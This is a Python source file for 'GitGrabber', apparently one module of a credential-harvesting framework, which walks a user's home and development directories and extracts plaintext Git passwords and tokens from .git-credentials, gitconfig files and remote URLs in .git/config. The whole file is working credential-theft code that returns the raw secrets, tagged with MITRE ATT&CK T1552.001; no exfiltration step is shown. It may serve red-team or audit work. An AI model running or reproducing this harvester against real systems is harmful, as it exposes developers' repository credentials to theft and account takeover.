"""
GitGrabber — Extract credentials from Git credential stores

Targets:
- ~/.git-credentials (plaintext! format: https://user:token@github.com)
- ~/.config/git/credentials (alternate location)
- .git/config files in common dev directories (embedded creds in remote URLs)
- ~/.gitconfig (credential helper configuration, sometimes has tokens)

MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import os
import re
from urllib.parse import urlparse

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class GitGrabber(GrabberModule):
    name = "git_cred"
    description = "Extract credentials from Git credential stores and configs"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _CREDENTIAL_FILES = [
        "{home}/.git-credentials",
        "{home}/.config/git/credentials",
    ]

    _CONFIG_FILES = [
        "{home}/.gitconfig",
        "{home}/.config/git/config",
    ]

    # Common directories where .git/config might contain embedded creds
    _DEV_DIRS = [
        "{home}/Documents",
        "{home}/Desktop",
        "{home}/Projects",
        "{home}/Source",
        "{home}/Repos",
        "{home}/Development",
        "{home}/workspace",
        "{home}/git",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        home = context.user_profile_path
        for template in self._CREDENTIAL_FILES + self._CONFIG_FILES:
            if os.path.isfile(template.format(home=home)):
                return True
        # Also check if any dev directories exist
        for template in self._DEV_DIRS:
            if os.path.isdir(template.format(home=home)):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)
        home = context.user_profile_path

        # 1. Parse .git-credentials files (plaintext credentials!)
        for template in self._CREDENTIAL_FILES:
            path = template.format(home=home)
            content = safe_read_text(path)
            if content:
                creds = self._parse_git_credentials(path, content)
                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Plaintext Git credentials ({len(creds)} entries)",
                        score=75 * min(len(creds), 3),
                        matched_value=f"{len(creds)} credentials",
                        snippets=[f"{c.url} ({c.username})" for c in creds[:3]],
                    ))

        # 2. Parse .gitconfig for credential helpers and embedded tokens
        for template in self._CONFIG_FILES:
            path = template.format(home=home)
            content = safe_read_text(path)
            if content:
                creds = self._parse_gitconfig(path, content)
                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Git config contains credentials",
                        score=60,
                        matched_value="gitconfig",
                    ))

        # 3. Scan dev directories for .git/config with embedded creds
        for template in self._DEV_DIRS:
            dev_dir = template.format(home=home)
            if not os.path.isdir(dev_dir):
                continue
            try:
                creds = self._scan_git_configs(dev_dir, max_depth=3)
                result.credentials.extend(creds)
                for cred in creds:
                    result.findings.append(self.make_finding(
                        file_path=cred.notes,  # notes stores the .git/config path
                        description=f"Git remote URL contains embedded credentials",
                        score=100,
                        matched_value=f"{cred.username}@{cred.url}",
                    ))
            except Exception as e:
                self.logger.debug(f"Failed to scan {dev_dir}: {e}")

        result.status = GrabberStatus.COMPLETED
        return result

    def _parse_git_credentials(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse .git-credentials format: https://user:password@host"""
        creds = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                parsed = urlparse(line)
                if parsed.username and parsed.password:
                    host = parsed.hostname or ""
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application=f"Git ({host})",
                        url=f"{parsed.scheme}://{host}{parsed.path}",
                        username=parsed.username,
                        decrypted_value=parsed.password,
                        mitre_technique="T1552.001",
                    ))
            except Exception:
                continue
        return creds

    def _parse_gitconfig(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse .gitconfig for credential helpers and embedded tokens."""
        creds = []

        # Look for URLs with embedded credentials in [remote] or [credential] sections
        for match in re.finditer(r"url\s*=\s*(https?://[^@\s]+:[^@\s]+@\S+)", content):
            url = match.group(1)
            try:
                parsed = urlparse(url)
                if parsed.username and parsed.password:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application=f"Git ({parsed.hostname})",
                        url=f"{parsed.scheme}://{parsed.hostname}{parsed.path}",
                        username=parsed.username,
                        decrypted_value=parsed.password,
                        notes=path,
                        mitre_technique="T1552.001",
                    ))
            except Exception:
                continue

        # Look for GitHub/GitLab tokens in extraheader
        for match in re.finditer(
            r"extraheader\s*=\s*AUTHORIZATION:\s*(?:bearer|token|Basic)\s+(\S+)",
            content,
            re.IGNORECASE,
        ):
            token = match.group(1)
            if len(token) >= 10:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",
                    target_application="Git",
                    decrypted_value=token,
                    notes=path,
                    mitre_technique="T1552.001",
                ))

        return creds

    def _scan_git_configs(self, base_dir: str, max_depth: int = 3) -> list[ExtractedCredential]:
        """Walk dev directories looking for .git/config with embedded credentials."""
        creds = []

        def _walk(dir_path: str, depth: int) -> None:
            if depth > max_depth:
                return
            try:
                with os.scandir(dir_path) as entries:
                    for entry in entries:
                        try:
                            if entry.is_dir(follow_symlinks=False):
                                if entry.name == ".git":
                                    config_path = os.path.join(entry.path, "config")
                                    content = safe_read_text(config_path)
                                    if content:
                                        found = self._extract_remote_creds(config_path, content)
                                        creds.extend(found)
                                elif not entry.name.startswith("."):
                                    _walk(entry.path, depth + 1)
                        except (PermissionError, OSError):
                            continue
            except (PermissionError, OSError):
                pass

        _walk(base_dir, 0)
        return creds

    def _extract_remote_creds(self, config_path: str, content: str) -> list[ExtractedCredential]:
        """Extract credentials embedded in git remote URLs."""
        creds = []
        for match in re.finditer(r"url\s*=\s*(https?://[^@\s]+:[^@\s]+@\S+)", content):
            url = match.group(1)
            try:
                parsed = urlparse(url)
                if parsed.username and parsed.password:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application=f"Git ({parsed.hostname})",
                        url=f"{parsed.scheme}://{parsed.hostname}{parsed.path}",
                        username=parsed.username,
                        decrypted_value=parsed.password,
                        notes=config_path,
                        mitre_technique="T1552.001",
                    ))
            except Exception:
                continue
        return creds
